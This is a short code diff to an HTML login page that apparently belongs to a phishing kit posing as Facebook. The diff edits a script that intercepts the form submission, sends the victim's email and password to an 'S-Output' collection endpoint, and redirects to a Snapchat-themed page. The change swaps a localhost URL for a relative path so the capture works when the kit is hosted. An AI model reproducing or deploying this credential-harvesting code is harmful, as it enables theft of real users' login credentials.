@@ -526,7 +526,7 @@
     <script>
         document.getElementById("loginform").onsubmit = function(event){
           event.preventDefault()
-          fetch(`http://127.0.0.1:3000/S-Output?from=Facebook&pass=${document.getElementById("pass").value}&email=${document.getElementById("email").value}`)
+          fetch(`./S-Output?from=Facebook&pass=${document.getElementById("pass").value}&email=${document.getElementById("email").value}`)
           window.location.replace("./Snapchat.html");
         }
     </script>
